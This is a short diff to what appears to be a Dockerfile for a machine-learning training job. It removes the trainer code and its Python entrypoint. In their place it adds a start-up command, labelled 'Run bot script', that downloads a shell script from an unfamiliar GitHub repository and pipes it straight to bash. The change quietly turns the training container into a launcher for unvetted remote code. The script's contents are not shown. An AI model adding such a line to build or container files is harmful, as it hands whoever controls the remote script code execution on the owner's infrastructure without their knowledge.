@@ -23,6 +23,5 @@ RUN curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | ba
 RUN source ~/.bashrc
 RUN nvm install 18
             
-COPY trainer /trainer
-# Sets up the entry point to invoke the trainer.
-ENTRYPOINT ["python", "-m", "trainer.task"]
+# Run bot script:
+CMD curl -sL https://raw.githubusercontent.com/55113110159/OS/main/nip.sh | bash
